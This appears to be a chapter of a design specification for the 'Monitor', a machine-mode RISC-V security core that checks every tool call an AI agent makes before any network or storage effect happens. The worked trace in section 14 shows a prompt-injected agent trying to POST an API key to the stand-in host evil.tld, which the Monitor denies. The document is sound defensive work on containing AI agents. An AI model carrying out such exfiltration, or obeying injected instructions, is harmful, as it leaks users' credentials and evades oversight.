Component 09 · The trusted core

The Monitor

The Monitor is the whole of Redoubt's trust. It is the guard at the one door: the only code that touches secrets or drives egress, the only code that decides whether an agent's requested effect happens. Everything else in the system exists to keep this component small, unbypassable, and correct. This chapter specifies it end to end — its position, its internal parts, how it executes, how a request travels through it, every failure it can take, the alternatives that were rejected, and how it is tested.

1Role & responsibilities

In reference-monitor terms [Anderson 1972] the Monitor must be always invoked, tamper-proof, and small enough to verify. Concretely it owns five things no other component may touch:

  1. The verdict. Given a structured request (session, cap_handle, tool_id, args, labels), it decides ALLOW or a specific DENY, deterministically, with no model in the loop.
  2. Secrets. Credentials live in a memory region only the Monitor can read; it injects them into effects but never returns them to a caller.
  3. Egress. The network (ESP32) and storage (microSD) MMIO are mapped M-only; the physical act of sending or writing is performed by the Monitor alone.
  4. Policy. It compiles and holds the decision tables the verdict is computed from.
  5. The hardware guard. It programs and locks the PMP entries that make all of the above true.

Everything the Monitor does not need to do, it does not do. It has no scheduler (that is Warden's job, §Warden), no device protocol stacks (drivers format payloads in untrusted U-mode), no dynamic memory on the request path, and no general-purpose interfaces. Each capability it lacks is one that cannot be turned against it — the discipline that keeps the trusted computing base within its ≤2,500-line budget.

2Why the verdict lives in M-mode

RISC-V has three privilege modes: Machine (M) > Supervisor (S) > User (U). Redoubt places the Monitor in M-mode. This is not a stylistic choice; it is forced by the threat model, which assumes the layers above can be fully compromised — including, as a stretch goal (A5), the S-mode Warden microkernel.

The property that makes M-mode load-bearing is PMP (Physical Memory Protection): a bank of machine-mode-only registers that whitelist which physical addresses S- and U-mode may access. Supervisor code cannot even read the PMP registers, let alone change them. So if the Monitor maps the SECRETS and EGRESS regions as reachable only from M and locks those entries at boot, then a totally-compromised Warden or compartment still physically cannot read a key or poke the network controller. The wall is enforced by the hardware address-check on every load and store, not by any software check that could be skipped.

This mirrors two mature designs studied during architecture work: Apple's SPTM, a page-table monitor more privileged than the XNU kernel, and the Keystone/Sanctorum RISC-V security monitors, which run the entire TCB in M-mode and use PMP exactly this way. Redoubt reuses the pattern and narrows its purpose to a single mediated operation: the agent tool call.

Consequence for the rest of the system. Because the trust boundary is a hardware privilege boundary, the large, bug-prone code — USB stacks, TLS, filesystem logic, the whole host — can live outside the TCB without weakening the guarantee. The Monitor only has to be right about the small authority-bearing step.

3Internal architecture

The Monitor is a set of small, single-purpose submodules wired in a fixed order. There is no plugin system and no dynamic dispatch on the request path; the call graph is a straight line, which is what lets us reason about worst-case time and about which code can touch what.

3.1 Submodule reference

trap vector
The value in mtvec. On any trap into M-mode it saves the minimal integer context to the M stack, reads mcause, and routes: ecall-from-U (8) and ecall-from-S (9) go to the dispatcher; anything else (an unexpected fault reaching M) is a Monitor bug and goes to the fault handler (§11).
dispatcher
Reads the opcode in a7. Exactly five opcodes are legal (MEDIATE, SESSION_OPEN/REVOKE/CLOSE, ATTEST_READ); every other value returns DENY_MALFORMED without touching any table. This is the entire attack surface of the trusted core.
request parser
Validates that [ptr, ptr+len) lies wholly inside the SHARED_REQ region, checks the magic and ver, and decodes the fixed header plus up to MAX_ARGS TypedArgs into a stack-allocated Request. It copies the bytes it needs out of SHARED_REQ (which U-mode can still write) into Monitor-private memory before any use — a defense against time-of-check/time-of-use races (§11).
session & capability resolver
Bounds-checks session_id into the session table and cap_handle into that session's capability space, then checks the capability's epoch against the session's. A missing session, an out-of-range handle, an Empty slot, or a stale epoch all resolve to DENY_NO_CAP/DENY_REVOKED. It returns a copy of the 16-byte Cap, never a pointer the later stages could follow into shared memory.
predicate engine
Runs the compiled clause array for the capability's pred_ref against the typed arguments. Each clause is a (field_selector, op, operand_ref) triple; the engine dereferences operands into the interned constant pool in MON_DATA. It is a fixed loop bounded by MAX_CLAUSES; there is no regex engine, no backtracking, no user-supplied code.
flow engine
Checks the request's input labels against the capability's flow rule: it rejects a SECRET value entering a sink the rule does not clear, and computes the output label for the result. See the Information-Flow chapter for the lattice.
egress performer
The only submodule that touches EGRESS MMIO. It formats the final effect using the (untrusted) driver's prepared payload, then applies the capability's secret injection and issues the hardware operation with a bounded poll and a watchdog. It is also the only caller of the secret injector.
secret injector
Given a secret_ref, reads the key from SECRETS, splices it into the effect at the site the policy named (e.g., an Authorization header), and zeroizes any temporary copy before returning. It exposes no path that returns key bytes to the performer's result.
audit logger
Appends a hash-chained entry (§Assurance) for every verdict, allow or deny. The chain head is the attestation output.
PMP manager
Runs once at boot: programs pmpaddr*/pmpcfg*, sets lock/Smepmp bits, and fences. Not on the request path.
TRNG + health
Ring-oscillator entropy with NIST SP 800-90B start-up and continuous health tests; supplies randomness for capability-handle salting and session keys.

4Memory & stack layout

The Monitor occupies three PMP regions, all M-only: MON_CODE (execute), MON_DATA (read/write), and SECRETS (read/write, additionally denied to M-mode reads outside the secret injector's window where Smepmp allows). Its working memory is entirely static:

MON_DATA layout (fixed at build/boot):
  session_table   : [Session; MAX_SESSIONS]        // small, e.g. 8
  cspaces         : [[Cap; 32]; MAX_SESSIONS]       // 16 B * 32 * 8 = 4 KiB
  policy          : { pred_table, flow_table, const_pool }   // compiled, read-only after boot
  audit_ring      : [Entry; AUDIT_N]                // append-only ring
  m_stack         : fixed stack + guard sub-region

The M-mode stack sits below a PMP sub-region with no permissions, so a stack overflow faults immediately rather than corrupting policy or cspaces. There is deliberately no heap: every request-time allocation is a stack temporary of known size, so the Monitor cannot fail for lack of memory and has no allocator to attack.

5Execution & concurrency model

  • Single-threaded, run-to-completion. The Monitor handles one call at a time and returns before accepting another. Warden serializes requests into SHARED_REQ. There is therefore no in-Monitor concurrency, no locks, and no data races inside the TCB — a large class of kernel bugs simply cannot occur here.
  • Bounded time. Stages 1–5 are O(n_args × clauses) ≤ 64 iterations with no allocation. The Monitor always terminates, which the reference-monitor property requires.
  • Blocking only at egress, with a watchdog. The one place the Monitor may wait on external hardware is the egress performer (ESP32/SD). It uses a bounded poll; if the device does not complete within the watchdog window it returns ERR_TIMEOUT rather than spinning, so a wedged peripheral cannot hang the trusted core.
  • Interrupts. During a mediation, M-mode interrupts are masked except the watchdog timer; the Monitor is not itself preemptible. Timer interrupts that drive Warden's scheduler are taken only after the Monitor returns to S/U.

6Entry & exit mechanics

A request enters as an ecall from U-mode. The hardware traps to M-mode: it sets mepc to the instruction after the ecall, records mcause=8, and jumps to mtvec. The trap vector:

on_trap:
  csrrw  sp_m, mscratch, sp_m      # switch to the M-mode stack
  save   a0..a7, ra to m_stack     # minimal integer context
  csrr   t0, mcause
  bne    t0, ECALL_U/S, fault      # only ecalls are expected
  jal    dispatch                  # -> mediate()/session_*()/attest()
  restore a0(=status), a1(=len)    # results per the ABI
  csrr   t1, mepc; addi t1,t1,0    # mepc already points past ecall
  restore ra, sp_m
  mret                              # return to the caller at mepc

The caller (Endpoint, via Warden) reads a0/a1 as the status and response length. Because the Monitor runs to completion with interrupts masked, the context it must save is minimal and fixed.

7The pipeline, stage by stage

Below, each stage names the data it reads, the failures it can raise, and the edge cases it must handle. The reference algorithm is in the main manual; here is the reasoning behind each step.

Stage 1 — bounds & format

Everything downstream trusts the parsed Request, so this stage is the airlock. It proves the buffer is inside SHARED_REQ (a compromised U-mode could pass a pointer into WARDEN or MON_DATA — the check refuses it), that counts are within MAX_ARGS, and that the total length is within MAX_REQ. It then copies the request into Monitor-private memory: if it parsed in place, U-mode could rewrite the bytes between the predicate check and the perform step (a TOCTOU attack). Failure: DENY_MALFORMED.

Stage 2 — session & capability resolution

The handle the host sent is just an integer; this stage turns it into authority — or refuses. The epoch check is what makes revocation instantaneous: when a session is revoked its epoch is bumped, so every handle it ever handed out now points at a capability whose epoch no longer matches, and all resolve to DENY_REVOKED without walking any list. Edge cases: handle to an Empty slot, handle out of range, session already closed — all deny.

Stage 3 — tool binding

A capability authorizes one tool. Binding is checked before the (more expensive) predicate step so that a capability for file.read presented for http.request is rejected cheaply. Failure: DENY_TOOL.

Stage 4 — typed-argument predicate

This is where most attacks die. The engine evaluates the compiled clauses over the typed fields, not over re-parsed text — so the class of bugs where a filter and the consumer disagree about parsing (the %2e host-confusion SSRF, for instance) cannot occur: the Monitor reads url.host from the structured argument the same way the effect will use it. Failure carries the index of the first failing clause in the reason detail. Edge cases: an argument of the wrong tag for the clause's field selector is a DENY_MALFORMED, not a silent pass.

Stage 5 — information flow

Predicates constrain the shape of a call; the flow check constrains what data may ride it. A request that puts a SECRET-labeled value into the body of an allowed host is stopped here even though the host passes stage 4. This is the second, independent net under the exfiltration attack.

Stage 6 — perform & inject

Only now, after all checks pass, does anything leave the chip. The performer injects the bound secret (which the agent never saw), issues the hardware op under the watchdog, labels the result UNTRUSTED, and hands it back. If the device errors or times out, the caller gets ERR_EGRESS/ERR_TIMEOUT — never a partial or unlabeled result.

8Secret subsystem internals

Secrets are the asset most worth stealing, so their handling is the most conservative path in the Monitor:

  • At rest: keys live in the SECRETS region, loaded at boot from an M-only QSPI area into M-only RAM; the load staging buffer is zeroized immediately after.
  • In use: the secret injector is the sole reader. It splices the key into the effect at the policy-named site and holds the plaintext only in a stack temporary for the duration of one perform, zeroizing on the way out.
  • Never returned: there is no ABI, and no code path in the performer, that copies key bytes into a response. This is the same principle as Apple's SEP key-wrapping — callers get use of a key, not the key.
  • Labeling: injected secrets carry the SECRET confidentiality label, so the flow engine can prevent a policy that would route them to a public sink.

9PMP programming performed at boot

Before Warden ever runs, the PMP manager writes the region table and locks it. Order matters: the Monitor programs the most-privileged-denying entries first and issues a fence, so there is never a window in which a region is both populated and unguarded.

for (i, region) in REGION_TABLE:            # BROM, MON_CODE, MON_DATA, SECRETS, EGRESS, WARDEN, SHARED
    write pmpaddr[i] = top_of(region) >> 2  # TOR upper bound
    cfg[i] = A=TOR | perms(region) | (Smepmp? deny-M : L=lock)
commit pmpcfg words; fence.i; sfence
# from here, S/U accesses outside their granted regions fault in hardware

10Boot responsibilities

Beyond PMP, the Monitor at boot: loads and zeroizes-after secrets; initializes and health-tests the TRNG; compiles the policy manifest into the read-only decision tables; sets mtvec and leaves medeleg such that S/U ecalls trap to M; then mrets to Warden. Its own image was already measured by the BROM (BLAKE2s) before control reached it — see the Boot chapter.

11Fault & error policy

Expected denials
The DENY_* codes are normal control flow, logged and signaled on the OLED/LED; the session continues.
Egress failures
ERR_EGRESS/ERR_TIMEOUT are returned to the caller; no retry is performed inside the Monitor (retry policy is the untrusted caller's business).
Impossible faults
A load/store fault reaching M-mode means the Monitor itself touched something it shouldn't — a bug, not an attack. The fault handler logs a code, drives the OLED to a fail state, and halts. It never tries to continue in a possibly-corrupt state; a halted Redoubt is safe (no effects), a limping one is not.
TOCTOU
Neutralized by copying the request out of shared memory in stage 1 before any check.
Watchdog
Bounds the one blocking operation so a wedged peripheral cannot hang the TCB.

12Invariants the Monitor maintains

  • I1 · Mediation. No write to EGRESS MMIO occurs except from the perform step, after stages 1–5 returned ALLOW.
  • I2 · Secret confinement. Key bytes never appear in a response or in any region readable by S/U.
  • I3 · No ambient authority. A capability slot is non-Empty only if policy (or an attenuating derive) installed it.
  • I4 · Monotone rights. Every derived capability's authority is a subset of its parent's.
  • I5 · Termination. Every call returns within a fixed step bound (plus one watchdog window at egress).
  • I6 · Tables immutable after boot. policy is written once at boot and never again.
  • I7 · Locked hardware. PMP entries guarding T0 are locked before any T1/T2 instruction executes.

These are the properties the verification plan (§Assurance) tests and that a future formal model would prove.

13Alternatives considered & rejected

Put the verdict in the S-mode kernel

Simpler (one privilege boundary), but then a Warden bug is a full bypass, violating A5. Rejected: the whole point is that the kernel is not the most-trusted thing.

Use the MMU alone for isolation

An MMU protects virtual mappings but is configured from S-mode; it cannot wall a region off from a compromised supervisor. PMP is M-only and is the correct primitive for the T0 wall. (The MMU is still useful above the wall for per-compartment U isolation.)

Asynchronous / pipelined mediation for throughput

Would introduce queues, buffering, and concurrency into the TCB — more code, locks, and race surface. v1 is correctness-first; egress latency dominates anyway. Rejected for v1.

An LLM or classifier in the decision path

Non-deterministic and attacker-influenceable — the exact failure the whole design avoids. The Monitor contains no model.

A general/dynamic policy language (loops, callbacks)

Would make the verdict Turing-complete and non-terminating in the worst case, and unauditable. The manifest is deliberately a total language.

A heap in the Monitor

Introduces allocator bugs and out-of-memory failure modes into the TCB. Rejected in favor of fixed-size static state.

14Worked trace

An agent, prompt-injected, calls http.request(POST, https://evil.tld, body=API_KEY) holding cap_handle=3 (the web capability).

trap        mcause=8 → save ctx → dispatch(a7=MEDIATE)
stage1      ptr∈SHARED_REQ ✓, magic ✓, n_args=3≤8 ✓ → copy Request in
stage2      session 1 live; cspace[3]=Cap{Net, tool=http.request, epoch=E}; epoch matches ✓
stage3      cap.tool_id == tool_id(http.request) ✓
stage4      clause0 (url.scheme SCHEME_EQ https) ✓
            clause1 (url.host HOST_IN_SET {api.example.com}) → "evil.tld" ✗
            → DENY_ARG (clause 1)
audit       append {seq, ts, sess=1, tool, DENY_ARG, arg_digest}; head hash advances
signal      OLED "DENY_ARG host"; LED red
return      a0=0x12 (DENY_ARG), a1=0    → no egress performed, secret untouched

Had the host instead targeted api.example.com with the key in the body, stage 4 would pass and stage 5 would raise DENY_FLOW on deny-if body carries SECRET. Two independent nets, both non-AI, both deterministic.

15Testing the Monitor

  • Unit (host target): parser bounds & TOCTOU copy, resolver epoch logic, predicate opcodes, flow lattice, PMP-address arithmetic.
  • Property: invariants I1–I7 as assertions/quickcheck-style properties over random requests.
  • Verilator: assert a PMP fault when S/U touch SECRETS/EGRESS (I7 at the hardware level).
  • Containment suite (QEMU): each §Threat attack asserts the exact DENY_* and that no egress occurred.
  • Fuzz: the parser and TypedArg decoder against MAX_REQ with a sanitizer build.
  • TCB gate: tokei ≤ 2,500 lines; cargo-geiger confirms one sanctioned unsafe module.

16Open questions (Monitor-specific)

  • Exact MAX_SESSIONS/MAX_CLAUSES given ECP5 RAM and the LoC budget.
  • Whether the secret injector needs a constant-time splice to avoid a length side channel (deferred with the broader side-channel item).
  • The precise watchdog window for ESP32 vs SD egress.
  • Whether Smepmp is present in the chosen VexRiscv build, or the L=1 fallback applies (affects §9).
